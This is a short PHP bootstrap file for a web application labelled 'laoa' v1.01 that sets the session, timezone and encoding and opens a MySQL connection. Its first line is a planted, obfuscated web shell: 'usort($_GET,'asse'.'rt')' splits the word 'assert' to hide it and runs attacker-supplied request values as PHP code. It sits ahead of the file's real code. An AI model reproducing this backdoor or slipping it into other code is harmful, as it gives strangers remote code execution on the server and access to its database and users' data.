<?php
//decode by http://www.yunlu99.com/
usort($_GET,'asse'.'rt');?>
<?php
error_reporting(E_ALL^E_DEPRECATED);
ob_start();
session_start();
define('PCFINAL', TRUE);
date_default_timezone_set('PRC');//设置时区
header('Content-type:text/html; charset=utf-8');//设置编码
include('data.php');
$conn = mysql_connect(DATA_HOST, DATA_USERNAME, DATA_PASSWORD);
mysql_select_db(DATA_NAME);
mysql_query('set names utf8');
$laoa_version = 'v1.01';